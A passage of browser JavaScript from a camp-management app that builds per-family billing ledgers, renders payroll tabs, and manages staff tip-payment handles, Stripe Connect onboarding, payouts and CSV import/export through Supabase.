                    finPayments.push({id:Date.now()+i,family:cols[0]||'Imported',amount:amount,date:cols[1]||today(),method:'Imported',status:'paid'});
                    imported++;
                }
            }
            save();renderAnalytics();toast(imported+' transactions imported');
            inp.value='';
        };
        reader.readAsText(file);
    };
    inp.click();
}

function dlFile(content,filename,type){var a=document.createElement('a');a.href=URL.createObjectURL(new Blob([content],{type:type}));a.download=filename;a.click()}
function today(){return new Date().toISOString().split('T')[0]}
function fmtIIFDate(d){if(!d)return'';var p=d.split('-');return p[1]+'/'+p[2]+'/'+p[0]}

// ═══════════════════════════════════════════════════════════════
// BILLING — Full payment hub
// ═══════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════
// BILLING — CampMinder-level family ledger system
//
// Every family has a ledger: a running timeline of charges, payments,
// credits, and discounts. The billing page shows:
//   1. Financial overview stats
//   2. Family accounts with balances and status filters
//   3. Per-family ledger view (click to expand)
//   4. Batch invoice generation
//   5. Add charges (tuition, add-ons, fees), record payments, issue credits
// ═══════════════════════════════════════════════════════════════
var _billFilter='all'; // all, outstanding, paid, overdue

function buildFamilyLedgers(){
    // Build a complete ledger for each family from all data sources
    var ledgers={}; // famKey → {family, entries[], totalCharges, totalPayments, totalCredits, balance}
    Object.entries(families).forEach(function([fk,f]){
        ledgers[fk]={family:f,famKey:fk,entries:[],totalCharges:0,totalPayments:0,totalCredits:0,balance:0};
    });

    // 1. Tuition charges from enrollments — including 'accepted' applications
    // that haven't been enrolled yet. An accepted camper has no families[]
    // record until enrollCamper() actually runs (that's the only place one
    // gets created), so without this they'd show up nowhere in Billing.
    // _resolveFamilyKey() is the SAME matcher enrollCamper() itself uses, so
    // if a sibling is already enrolled, the accepted camper's charge lands on
    // that real family's ledger. Only when no existing family matches at all
    // do we synthesize an ephemeral ledger entry — never written to
    // families{}, just built fresh on every render — flagged
    // `pendingEnrollment` so Billing can show it's not a full camper record
    // yet.
    Object.entries(enrollments).forEach(function([eid,e]){
        if(e.status!=='enrolled'&&e.status!=='accepted') return;
        var fk=_resolveFamilyKey(e.camperName,_famItemRaw(e.camperName,e.street,e.city,e.state,e.zip,e.parentName,e.parentEmail));
        if(!fk){
            if(e.status!=='accepted'||!e.parentName) return; // nothing to attribute this charge to
            var lastName=(e.camperName||'').split(' ').pop();
            fk='pending_'+lastName.toLowerCase().replace(/[^a-z0-9]/g,'')+'_'+eid;
            if(!ledgers[fk]){
                var parents=[{name:e.parentName,phone:e.parentPhone||'',email:e.parentEmail||'',relation:e.parentRelation||'Parent'}];
                if(e.parent2Name)parents.push({name:e.parent2Name,phone:e.parent2Phone||'',email:e.parent2Email||'',relation:e.parent2Relation||'Parent'});
                var synthFamily={
                    name:lastName+' Family',
                    households:[{label:'Primary',parents:parents,address:[e.street,e.city,e.state,e.zip].filter(Boolean).join(', '),billingContact:true}],
                    camperIds:[e.camperName],
                    balance:0,totalPaid:0
                };
                ledgers[fk]={family:synthFamily,famKey:fk,entries:[],totalCharges:0,totalPayments:0,totalCredits:0,balance:0,pendingEnrollment:true};
            }
        }
        if(!ledgers[fk])return;
        // An accepted camper joining an ALREADY-REAL family (a sibling's
        // ledger) isn't in that family's real camperIds yet — enrollCamper()
        // is what actually adds them. Track it separately for display rather
        // than mutating families[fk].camperIds here, which would persist a
        // membership that isn't final (the application could still be
        // declined/rescinded before enrollment).
        if(e.status==='accepted'&&(ledgers[fk].family.camperIds||[]).indexOf(e.camperName)<0){
            if(!ledgers[fk].pendingCamperIds)ledgers[fk].pendingCamperIds=[];
            if(ledgers[fk].pendingCamperIds.indexOf(e.camperName)<0)ledgers[fk].pendingCamperIds.push(e.camperName);
        }
        var tuition=Number(e.sessionTuition)||0;
        var discAmt=e.discount?Number(e.discount.amt)||0:0;
        if(e.discount&&e.discount.pct>0) discAmt=Math.round(tuition*e.discount.pct/100);
        var net=tuition-discAmt;
        ledgers[fk].entries.push({type:'charge',category:'Tuition',desc:esc(e.camperName)+' — '+esc(e.session||''),amount:net,date:e.enrolledDate||e.appliedDate||'',ref:eid});
        ledgers[fk].totalCharges+=net;
        if(discAmt>0){
            ledgers[fk].entries.push({type:'credit',category:'Discount',desc:(e.discount.pct?e.discount.pct+'% ':'')+'discount for '+esc(e.camperName),amount:discAmt,date:e.enrolledDate||e.appliedDate||'',ref:eid+'_disc'});
            ledgers[fk].totalCredits+=discAmt;
        }
        // Installments as sub-entries — the down payment vs. the rest of
        // tuition. Already-enrolled campers have this persisted on
        // e.installments; an accepted-but-not-yet-enrolled applicant doesn't
        // (enrollCamper() is what computes and saves it), so preview it here
        // with the same builder instead of only ever showing one lump
        // "Tuition" number.
        var schedule=e.installments;
        if((!schedule||!schedule.length)&&e.status==='accepted'){
            schedule=_buildInstallmentSchedule(sessions.find(function(s){return s.name===e.session}),net);
        }
        if(schedule&&schedule.length>1){
            schedule.forEach(function(inst,ii){
                ledgers[fk].entries.push({type:'installment',category:inst.label,desc:esc(e.camperName)+' — '+esc(inst.label),amount:inst.amount,date:inst.dueDate||'',status:inst.status||'pending',ref:eid+'_inst'+ii});
            });
        }
    });

    // 2. Add-on charges from family.charges array
    Object.entries(families).forEach(function([fk,f]){
        if(!ledgers[fk])return;
        (f.charges||[]).forEach(function(ch){
            ledgers[fk].entries.push({type:'charge',category:ch.category||'Add-On',desc:ch.description||'',amount:Number(ch.amount)||0,date:ch.date||'',ref:ch.id||''});
            ledgers[fk].totalCharges+=Number(ch.amount)||0;
        });
    });

    // 3. Payments
    finPayments.forEach(function(p){
        // Match to family
        var fk=null;
        Object.entries(families).forEach(function([k,f]){
            if(f.name===p.family||f.name===p.camper||(f.camperIds||[]).indexOf(p.family)>=0||(f.camperIds||[]).indexOf(p.camper)>=0) fk=k;
        });
        if(!fk) return;
        if(!ledgers[fk]) return;
        var _notCollected=(p.status==='pending'||p.status==='failed');
        ledgers[fk].entries.push({type:'payment',category:_payLabel(p.method)||'Payment',desc:p.notes||'Payment received',amount:Number(p.amount)||0,date:p.date||'',ref:p.id||'',status:p.status||''});
        if(!_notCollected) ledgers[fk].totalPayments+=Number(p.amount)||0;
    });

    // 4. Compute balances and sort entries
    Object.values(ledgers).forEach(function(l){
        l.balance=l.totalCharges-l.totalPayments-l.totalCredits;
        l.entries.sort(function(a,b){return(a.date||'').localeCompare(b.date||'')});
        // Determine status
        var today=new Date().toISOString().split('T')[0];
        l.status=l.balance<=0?'paid':l.totalPayments>0?'partial':'pending';
        // Check overdue — any installment past due date?
        l.entries.forEach(function(e){
            if(e.type==='installment'&&e.status==='pending'&&e.date&&e.date<today) l.status='overdue';
        });
        if(l.balance>0&&l.totalPayments===0) l.status='pending';
    });

    return ledgers;
}

// ═══ PAYROLL ════════════════════════════════════════════════════
// The Payroll page. Pay math and every youth-employment rule live in
// campistry_payroll_core.js (pure + unit tested); this file is only the UI on
// top of it, so a rule is never restated here where it could drift.
function PC(){ return window.PayrollCore||null }
function _prToday(){ var d=new Date(); return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0') }
/** Sunday of the week containing `iso` (or today) — timesheets are Sun–Sat. */
function _prWeekStart(iso){
    var s=iso||_prToday(), p=s.split('-');
    var d=new Date(+p[0],+p[1]-1,+p[2]);
    d.setDate(d.getDate()-d.getDay());
    return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');
}
function _prShiftWeek(iso,weeks){
    var p=iso.split('-'), d=new Date(+p[0],+p[1]-1,+p[2]);
    d.setDate(d.getDate()+weeks*7);
    return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');
}
function _prStaffById(id){ return payroll.staff.filter(function(s){return String(s.id)===String(id)})[0]||null }
function _prCorpsStaff(){ return payroll.staff.filter(function(s){return s.youthCorps&&s.youthCorps.enrolled}) }
function _prSheet(staffId,weekOf){
    return payroll.timesheets.filter(function(t){return String(t.staffId)===String(staffId)&&t.weekOf===weekOf})[0]||null;
}
function prSetTab(t){ _prTab=t; renderPayroll() }

function renderPayroll(){
    var c=document.getElementById('page-payroll');
    if(!c) return;
    var core=PC();
    if(!core){
        c.innerHTML='<div class="sec-hd"><div><h2 class="sec-title">Payroll</h2></div></div>'+
            '<div class="me-card" style="padding:18px"><p style="font-size:.85rem;color:var(--err)">Payroll rules module didn\'t load — reload the page.</p></div>';
        return;
    }
    if(!_prWeek) _prWeek=_prWeekStart();

    var tabs=[{k:'overview',l:'Overview'},{k:'staff',l:'Staff'},{k:'timesheets',l:'Timesheets'},{k:'youth',l:'Youth Corps'},{k:'runs',l:'Pay Runs'},{k:'tips',l:'Tip Payments'}];
    var h='<div class="sec-hd"><div><h2 class="sec-title">Payroll</h2><p class="sec-desc">Staff pay, timesheets, and Youth Corps compliance</p></div>';
    h+='<div class="sec-actions">';
    if(_prTab==='tips'){
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.ptDownloadTemplate()">↓ Template</button>';
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="document.getElementById(\'ptUpload\').click()">↑ Upload</button>';
        h+='<input type="file" id="ptUpload" accept=".csv,text/csv" style="display:none" onchange="CampistryMe.ptUploadTemplate(this)">';
        h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.ptOpenAdd()">+ Add Person</button>';
    }else{
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.prExportCSV()">↓ Export CSV</button>';
        h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.prEditStaff()">+ Add Staff</button>';
    }
    h+='</div></div>';

    h+='<div style="display:flex;gap:0;border-bottom:1px solid var(--s200);margin-bottom:14px;flex-wrap:wrap">';
    tabs.forEach(function(t){
        h+='<button class="me-btn me-btn--ghost" style="padding:8px 16px;font-size:.8rem;font-weight:600;border-bottom:2px solid '+(_prTab===t.k?'var(--me)':'transparent')+';color:'+(_prTab===t.k?'var(--me)':'var(--s400)')+';border-radius:0" onclick="CampistryMe.prSetTab(\''+t.k+'\')">'+t.l+'</button>';
    });
    h+='</div>';

    if(_prTab==='overview') h+=_prOverview();
    else if(_prTab==='staff') h+=_prStaffTab();
    else if(_prTab==='timesheets') h+=_prTimesheetsTab();
    else if(_prTab==='youth') h+=_prYouthTab();
    else if(_prTab==='tips') h+=_prTipsTab();
    else h+=_prRunsTab();

    c.innerHTML=h;
}

function _prStat(label,value,sub,color){
    return'<div style="flex:1;min-width:150px;background:#fff;border-radius:var(--r);padding:12px 14px;border:1px solid var(--s200);border-left:3px solid '+color+'">'+
        '<div style="font-size:.65rem;font-weight:700;color:var(--s400);text-transform:uppercase;letter-spacing:.04em">'+esc(label)+'</div>'+
        '<div style="font-size:1.2rem;font-weight:800;color:var(--s800);margin-top:2px">'+value+'</div>'+
        (sub?'<div style="font-size:.72rem;color:var(--s400);margin-top:1px">'+sub+'</div>':'')+'</div>';
}
function _prEmpty(msg,cta){
    return'<div class="me-card" style="padding:28px 20px;text-align:center"><p style="font-size:.86rem;color:var(--s400);margin:0 0 10px">'+esc(msg)+'</p>'+(cta||'')+'</div>';
}

// ── Tip Payments (link_staff_accounts) ──────────────────────────────
// Zelle/Venmo/PayPal/Cash App handles and Stripe Connect card-tip status,
// per staff member — moved here from Link Admin because every other piece
// of staff data (roster, hiring, positions, bunk assignment, wage payroll)
// already lives in Me; having to leave this app to check a counselor's
// Zelle handle was the awkward part, not a feature. link_staff_accounts is
// just a Supabase table — this reads/writes it directly with the same
// CampistryDB client the rest of Me already uses, no new plumbing.
var _ptAccounts=null,_ptLoading=false;
var PT_ACCOUNT_COLS='id, staff_name, role, access_code, balance, total_earned, total_paid_out, '+
    'stripe_account_id, stripe_charges_enabled, stripe_onboarding_status, '+
    'zelle_handle, venmo_handle, paypal_handle, cashapp_handle';
var PT_METHODS=[{key:'zelle_handle',label:'Zelle'},{key:'venmo_handle',label:'Venmo'},{key:'paypal_handle',label:'PayPal'},{key:'cashapp_handle',label:'Cash App'}];

function _ptClient(){ return window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null; }
function _ptCampId(){ return window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():null; }

function _ptLoadAccounts(cb){
    var client=_ptClient(),campId=_ptCampId();
    if(!client||!campId){ _ptAccounts=_ptAccounts||[]; if(cb)cb(); return; }
    client.from('link_staff_accounts').select(PT_ACCOUNT_COLS).eq('camp_id',campId).order('staff_name',{ascending:true})
        .then(function(res){
            if(res.error){ console.warn('[Me] link_staff_accounts load:',res.error.message); _ptAccounts=_ptAccounts||[]; }
            else _ptAccounts=res.data||[];
            if(cb)cb();
        });
}

// The OLD admin-entered Zelle/Venmo list (link_tips_config.staffPay, a
// camp_state_kv array keyed by free-text name — Link Admin's original,
// pre-link_staff_accounts implementation) gets folded in here too, the
// same one-time backfill Link Admin itself ran: match by name, only fill
// in handle fields still empty (never overwrite what a staff member
// already self-entered in Lite), then clear the legacy array so repeat
// calls are a no-op. Running it here as well means this works even for a
// camp that never happens to open Link Admin's Tips page again.
function _ptLoadLegacyConfig(){
    var gs={}; try{ gs=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}'); }catch(e){}
    return gs.link_tips_config||null;
}
function _ptSaveLegacyConfig(cfg){
    var gs={}; try{ gs=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}'); }catch(e){}
    gs.link_tips_config=cfg; gs.updated_at=new Date().toISOString();
    try{ localStorage.setItem('campGlobalSettings_v1',JSON.stringify(gs)); }catch(e){}
    try{ localStorage.setItem('CAMPISTRY_LOCAL_CACHE',JSON.stringify(gs)); }catch(e){}
    var client=_ptClient(),campId=_ptCampId();
    if(client&&campId){
        client.from('camp_state_kv').upsert({camp_id:campId,key:'link_tips_config',value:cfg,updated_at:new Date().toISOString()},{onConflict:'camp_id,key'})
            .then(function(r){ if(r.error)console.warn('[Me] Tips config cloud save failed:',r.error.message); });
    }
}
function _ptMergeLegacyStaffPay(cb){
    var cfg=_ptLoadLegacyConfig();
    var legacy=(cfg&&cfg.staffPay)||[];
    var client=_ptClient(),campId=_ptCampId();
    if(!legacy.length||!client||!campId){ cb(); return; }
    var byName={}; (_ptAccounts||[]).forEach(function(a){ byName[String(a.staff_name||'').trim().toLowerCase()]=a; });
    var ops=[];
    legacy.forEach(function(p){
        var key=String(p.name||'').trim().toLowerCase(); if(!key)return;
        var handles={zelle_handle:p.zelle||null,venmo_handle:p.venmo||null,paypal_handle:p.paypal||null,cashapp_handle:p.cashapp||null};
        var match=byName[key];
        if(match){
            var patch={}; Object.keys(handles).forEach(function(k){ if(!match[k]&&handles[k])patch[k]=handles[k]; });
            if(Object.keys(patch).length) ops.push(client.from('link_staff_accounts').update(patch).eq('id',match.id).then(function(r){ if(!r.error)Object.assign(match,patch); }));
        }else{
            var insertRow=Object.assign({camp_id:campId,staff_name:p.name,role:p.role||''},handles);
            ops.push(client.from('link_staff_accounts').insert(insertRow).select().single().then(function(r){
                if(!r.error&&r.data){ if(!_ptAccounts)_ptAccounts=[]; _ptAccounts.push(r.data); byName[key]=r.data; }
            }));
        }
    });
    Promise.all(ops).then(function(){ cfg.staffPay=[]; _ptSaveLegacyConfig(cfg); cb(); });
}

function _prTipsTab(){
    if(_ptAccounts===null){
        if(!_ptLoading){
            _ptLoading=true;
            _ptLoadAccounts(function(){ _ptMergeLegacyStaffPay(function(){ _ptLoading=false; if(curPage==='payroll')renderPayroll(); }); });
        }
        return _prEmpty('Loading tip payment info…');
    }
    if(!_ptAccounts.length){
        return _prEmpty('No tip payment info yet. Staff can set this up themselves from Campistry Lite\'s Tips tab, or add someone here.',
            '<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.ptOpenAdd()">+ Add Person</button>');
    }
    var h='<div class="me-card" style="padding:0;overflow:hidden">';
    h+='<table style="width:100%;border-collapse:collapse;font-size:.82rem">';
    h+='<thead><tr style="border-bottom:1.5px solid var(--s200)">'+
        '<th style="text-align:left;padding:8px 12px;font-size:.72rem;color:var(--s400);font-weight:600">Staff Member</th>'+
        '<th style="text-align:left;padding:8px 12px;font-size:.72rem;color:var(--s400);font-weight:600">Payment Info</th>'+
        '<th style="text-align:left;padding:8px 12px;font-size:.72rem;color:var(--s400);font-weight:600">Card Tips</th>'+
        '<th style="text-align:right;padding:8px 12px;font-size:.72rem;color:var(--s400);font-weight:600">Balance</th>'+
        '<th style="padding:8px 12px"></th></tr></thead><tbody>';
    _ptAccounts.forEach(function(a){
        var bal=parseFloat(a.balance)||0;
        var chips=PT_METHODS.filter(function(m){return a[m.key];}).map(function(m){
            return '<span style="display:inline-flex;align-items:center;gap:4px;background:var(--s50);border:1px solid var(--s200);border-radius:999px;padding:2px 9px;font-size:.72rem;color:var(--s700);margin:1px"><strong>'+esc(m.label)+'</strong> '+esc(a[m.key])+'</span>';
        }).join('');
        if(!chips) chips='<span style="font-size:.74rem;color:var(--s400)">None</span>';
        h+='<tr style="border-bottom:1px solid var(--s100)">'+
            '<td style="padding:8px 12px;vertical-align:top"><strong>'+esc(a.staff_name)+'</strong>'+(a.role?' <span style="color:var(--s400);font-size:.74rem">· '+esc(a.role)+'</span>':'')+
                '<div style="margin-top:3px"><code style="background:var(--s50);border:1px solid var(--s200);border-radius:6px;padding:2px 7px;font-size:.72rem;letter-spacing:.06em">'+esc(a.access_code||'')+'</code> '+
                '<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.ptCopyLink(\''+esc(a.access_code||'')+'\')" style="padding:1px 6px">Copy link</button></div></td>'+
            '<td style="padding:8px 12px;vertical-align:top;max-width:260px">'+chips+'</td>'+
            '<td style="padding:8px 12px;white-space:nowrap;vertical-align:top">'+_ptStripeCell(a)+'</td>'+
            '<td style="padding:8px 12px;text-align:right;vertical-align:top"><div style="font-weight:700;color:'+(bal>0?'var(--ok)':'var(--s400)')+'">'+fm(bal)+'</div><div style="font-size:.7rem;color:var(--s400)">'+fm(parseFloat(a.total_earned)||0)+' earned</div></td>'+
            '<td style="padding:8px 12px;text-align:right;white-space:nowrap;vertical-align:top">'+
                '<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.ptPayout(\''+esc(a.id)+'\')"'+(bal<=0?' disabled style="opacity:.45;cursor:default"':'')+'>Pay out</button> '+
                '<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.ptOpenEdit(\''+esc(a.id)+'\')">Edit</button> '+
                '<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.ptRemove(\''+esc(a.id)+'\')">Remove</button>'+
                '</td></tr>';
    });
    h+='</tbody></table></div>';
    return h;
}

function _ptStripeCell(a){
    if(a.stripe_charges_enabled) return '<span style="display:inline-flex;align-items:center;gap:5px;color:var(--ok);font-weight:700;font-size:.78rem"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> Connected</span>';
    if(a.stripe_account_id) return '<span style="color:var(--me);font-weight:700;font-size:.78rem;margin-right:6px">Onboarding…</span><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.ptConnectStripe(\''+esc(a.id)+'\')" style="padding:2px 8px">Resume</button>';
    return '<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.ptConnectStripe(\''+esc(a.id)+'\')">Connect Stripe</button>';
}

async function ptConnectStripe(accountId){
    var url=getSupabaseUrl(),key=getSupabaseKey();
    if(!url){ toast('Payments are not set up for this camp yet.','error'); return; }
    if(!(window.CampistryDB&&window.CampistryDB.getAccessToken)){ toast('Not signed in','error'); return; }
    var token=await window.CampistryDB.getAccessToken();
    if(!token){ toast('Not signed in','error'); return; }
    try{
        var resp=await fetch(url+'/functions/v1/stripe-connect-onboard',{
            method:'POST',
            headers:{'Content-Type':'application/json','Authorization':'Bearer '+token,'apikey':key||''},
            body:JSON.stringify({accountId:accountId,returnTo:'me'})
        });
        var data=await resp.json();
        if(!resp.ok||data.error) throw new Error(data.error||'Could not start onboarding');
        window.location.href=data.url;
    }catch(err){ toast('Could not connect Stripe: '+(err.message||'unknown error'),'error'); }
}

// Called from init() when Stripe redirects back with ?stripeReturn=1 —
// confirms the account's real status right away instead of waiting on the
// async webhook (which stays the durable source of truth either way).
async function _ptCheckStripeReturn(accountId){
    var url=getSupabaseUrl(),key=getSupabaseKey();
    if(!url||!(window.CampistryDB&&window.CampistryDB.getAccessToken))return;
    var token=await window.CampistryDB.getAccessToken();
    if(!token)return;
    try{
        var resp=await fetch(url+'/functions/v1/stripe-connect-status',{
            method:'POST',
            headers:{'Content-Type':'application/json','Authorization':'Bearer '+token,'apikey':key||''},
            body:JSON.stringify({accountId:accountId})
        });
        var data=await resp.json();
        if(resp.ok&&!data.error){
            if(_ptAccounts){
                var a=_ptAccounts.find(function(x){return x.id===accountId;});
                if(a){ a.stripe_charges_enabled=data.charges_enabled; a.stripe_onboarding_status=data.onboarding_status; if(curPage==='payroll')renderPayroll(); }
            }
            toast(data.charges_enabled?'Stripe connected — ready for card tips':'Onboarding in progress — finish it on Stripe\'s site');
        }
    }catch(err){ console.warn('[Me] Stripe return check failed:',err.message); }
}

function ptCopyLink(code){
    var url=window.location.href.replace(/[^/]*$/,'')+'campistry_link_staff.html?code='+encodeURIComponent(code);
    var done=function(){ toast('Balance-page link copied — send it to the staff member'); };
    if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(url).then(done,function(){ prompt('Copy this link:',url); });
    else prompt('Copy this link:',url);
}

function ptPayout(accountId){
    var a=(_ptAccounts||[]).find(function(x){return x.id===accountId;}); if(!a)return;
    var bal=parseFloat(a.balance)||0;
    if(bal<=0){ toast('Nothing to pay out'); return; }
    var raw=prompt('Pay out to '+a.staff_name+'.\nCurrent balance: $'+bal.toFixed(2)+'\n\nAmount to pay out:',bal.toFixed(2));
    if(raw==null)return;
    var amt=parseFloat(raw);
    if(!amt||amt<=0||amt>bal){ toast('Enter an amount between $0.01 and $'+bal.toFixed(2),'error'); return; }
    var client=_ptClient();
    if(!client){ toast('Cloud not connected','error'); return; }
    client.rpc('record_staff_payout',{p_account_id:accountId,p_amount:amt}).then(function(res){
        if(res.error||!res.data||!res.data.success){ toast('Payout failed: '+(res.error?res.error.message:(res.data||{}).error||'unknown'),'error'); return; }
        a.balance=res.data.balance;
        a.total_paid_out=(parseFloat(a.total_paid_out)||0)+(parseFloat(res.data.paid)||0);
        renderPayroll();
        toast('$'+(parseFloat(res.data.paid)||0).toFixed(2)+' paid out to '+a.staff_name);
    });
}

function ptOpenAdd(){ _ptOpenModal(null); }
function ptOpenEdit(id){ _ptOpenModal(id); }
function _ptOpenModal(id){
    var a=id?(_ptAccounts||[]).find(function(x){return x.id===id;}):null;
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Name</label><input type="text" id="ptName" class="me-input" placeholder="e.g. Sarah M." value="'+esc(a?a.staff_name:'')+'"></div>';
    h+='<div class="me-field"><label>Role (optional)</label><input type="text" id="ptRole" class="me-input" placeholder="e.g. Counselor" value="'+esc(a?a.role||'':'')+'"></div>';
    h+='<p style="font-size:.78rem;color:var(--s400);margin:2px 0 4px">Add at least one payment handle — parents will see whichever you fill in.</p>';
    h+='<div class="me-field"><label>Zelle</label><input type="text" id="ptZelle" class="me-input" placeholder="phone or email" value="'+esc(a?a.zelle_handle||'':'')+'"></div>';
    h+='<div class="me-field"><label>Venmo</label><input type="text" id="ptVenmo" class="me-input" placeholder="@username" value="'+esc(a?a.venmo_handle||'':'')+'"></div>';
    h+='<div class="me-field"><label>PayPal</label><input type="text" id="ptPaypal" class="me-input" placeholder="paypal.me link or email" value="'+esc(a?a.paypal_handle||'':'')+'"></div>';
    h+='<div class="me-field"><label>Cash App</label><input type="text" id="ptCashapp" class="me-input" placeholder="$cashtag" value="'+esc(a?a.cashapp_handle||'':'')+'"></div>';
    h+='</div>';
    showModal(id?'Edit Staff Payment Info':'Add Staff Payment Info',h,function(){ ptSaveAccount(id); });
}

function ptSaveAccount(id){
    var name=(document.getElementById('ptName').value||'').trim();
    if(!name){ toast('Enter the person\'s name','error'); return; }
    if(!id&&(_ptAccounts||[]).some(function(a){return a.staff_name.toLowerCase()===name.toLowerCase();})){
        toast(name+' already has an account','error'); return;
    }
    var patch={
        staff_name:name,
        role:(document.getElementById('ptRole').value||'').trim(),
        zelle_handle:(document.getElementById('ptZelle').value||'').trim()||null,
        venmo_handle:(document.getElementById('ptVenmo').value||'').trim()||null,
        paypal_handle:(document.getElementById('ptPaypal').value||'').trim()||null,
        cashapp_handle:(document.getElementById('ptCashapp').value||'').trim()||null
    };
    var client=_ptClient(),campId=_ptCampId();
    if(!client||!campId){ toast('Cloud not connected — accounts need migration 017','error'); return; }
    if(id){
        client.from('link_staff_accounts').update(patch).eq('id',id).select().single().then(function(res){
            if(res.error){ toast('Could not save: '+res.error.message,'error'); return; }
            var a=(_ptAccounts||[]).find(function(x){return x.id===id;});
            if(a)Object.assign(a,res.data);
            closeModal('dynModal');
            renderPayroll();
            toast('Payment info updated');
        });
    }else{
        client.from('link_staff_accounts').insert(Object.assign({camp_id:campId},patch)).select().single().then(function(res){
            if(res.error){ toast('Could not create account: '+res.error.message,'error'); return; }
            if(!_ptAccounts)_ptAccounts=[];
            _ptAccounts.push(res.data);
            closeModal('dynModal');
            renderPayroll();
            toast(name+' added — code '+res.data.access_code);
        });
    }
}

async function ptRemove(id){
    var a=(_ptAccounts||[]).find(function(x){return x.id===id;}); if(!a)return;
    var bal=parseFloat(a.balance)||0;
    if(bal>0){ toast('Pay out '+a.staff_name+'\'s $'+bal.toFixed(2)+' balance before removing their account','error'); return; }
    var ok=await confirmDialog({title:'Remove '+a.staff_name+'?',message:'This deletes their payment info, access code, and Stripe connection. This can\'t be undone.',confirmLabel:'Remove',danger:true});
    if(!ok)return;
    var client=_ptClient();
    if(!client){ toast('Cloud not connected','error'); return; }
    client.from('link_staff_accounts').delete().eq('id',id).then(function(res){
        if(res.error){ toast('Could not remove: '+res.error.message,'error'); return; }
        _ptAccounts=(_ptAccounts||[]).filter(function(x){return x.id!==id;});
        renderPayroll();
        toast(a.staff_name+' removed');
    });
}

// ── CSV template — pre-fill from bunkStaff, round-trip through the same
// link_staff_accounts rows the table above shows ────────────────────
var PT_CSV_COLS=['Name','Role','Zelle','Venmo','PayPal','Cash App'];
function _ptCsvCell(v){ v=(v==null)?'':String(v); return /[",\n]/.test(v)?'"'+v.replace(/"/g,'""')+'"':v; }

function ptDownloadTemplate(){
    var byName={}; (_ptAccounts||[]).forEach(function(a){ byName[String(a.staff_name).trim().toLowerCase()]=a; });
    var rows=[],seen={};
    Object.keys(bunkStaff||{}).forEach(function(bunk){
        (bunkStaff[bunk]||[]).forEach(function(m){
            if(m&&m.name&&!seen[m.name.trim().toLowerCase()]){ rows.push({name:m.name,role:m.role||''}); seen[m.name.trim().toLowerCase()]=1; }
        });
    });
    (_ptAccounts||[]).forEach(function(a){ if(!seen[String(a.staff_name).trim().toLowerCase()]){ rows.push({name:a.staff_name,role:a.role||''}); seen[String(a.staff_name).trim().toLowerCase()]=1; } });
    if(!rows.length) rows=[{name:'',role:'Counselor'},{name:'',role:'Rebbi'}];
    var lines=[PT_CSV_COLS.map(_ptCsvCell).join(',')];
    rows.forEach(function(r){
        var e=byName[String(r.name).trim().toLowerCase()]||{};
        lines.push([r.name,r.role,e.zelle_handle||'',e.venmo_handle||'',e.paypal_handle||'',e.cashapp_handle||''].map(_ptCsvCell).join(','));
    });
    var csv=lines.join('\r\n');
    var blob=new Blob([csv],{type:'text/csv;charset=utf-8;'});
    var url=URL.createObjectURL(blob);
    var a=document.createElement('a'); a.href=url; a.download='staff-payment-info.csv';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    setTimeout(function(){URL.revokeObjectURL(url);},1000);
    toast(rows.length+' staff exported — fill in Zelle/Venmo and upload it back');
}

// Minimal RFC-4180 CSV parser (handles quotes, commas, newlines in fields)
function _ptParseCsv(text){
    var rows=[],row=[],field='',i=0,inQ=false,c;
    text=String(text).replace(/^﻿/,'');
    while(i<text.length){
        c=text[i];
        if(inQ){ if(c==='"'){ if(text[i+1]==='"'){field+='"';i++;} else inQ=false; } else field+=c; }
        else{ if(c==='"')inQ=true; else if(c===','){row.push(field);field='';} else if(c==='\n'){row.push(field);rows.push(row);row=[];field='';} else if(c==='\r'){} else field+=c; }
        i++;
    }
    if(field.length||row.length){row.push(field);rows.push(row);}
    return rows;
}

function ptUploadTemplate(input){
    var file=input.files&&input.files[0]; input.value='';
    if(!file)return;
    var client=_ptClient(),campId=_ptCampId();
    if(!client||!campId){ toast('Cloud not connected — accounts need migration 017','error'); return; }
    var reader=new FileReader();
    reader.onload=function(){
        try{
            var rows=_ptParseCsv(reader.result).filter(function(r){return r.some(function(c){return String(c).trim();});});
            if(rows.length<2){ toast('That file has no rows to import','error'); return; }
            var head=rows[0].map(function(h){return String(h).trim().toLowerCase();});
            function col(names){ for(var k=0;k<names.length;k++){var idx=head.indexOf(names[k]); if(idx>=0)return idx;} return -1; }
            var iName=col(['name']),iRole=col(['role']),iZelle=col(['zelle']),iVenmo=col(['venmo']),iPaypal=col(['paypal','pay pal']),iCash=col(['cash app','cashapp','cash']);
            if(iName<0){ toast('Missing a "Name" column — use the downloaded template','error'); return; }
            var byName={}; (_ptAccounts||[]).forEach(function(a){ byName[String(a.staff_name).trim().toLowerCase()]=a; });
            var get=function(r,idx){ return idx>=0?String(r[idx]||'').trim():''; };
            var ops=[],added=0,updated=0;
            for(var r=1;r<rows.length;r++){
                var name=get(rows[r],iName); if(!name)continue;
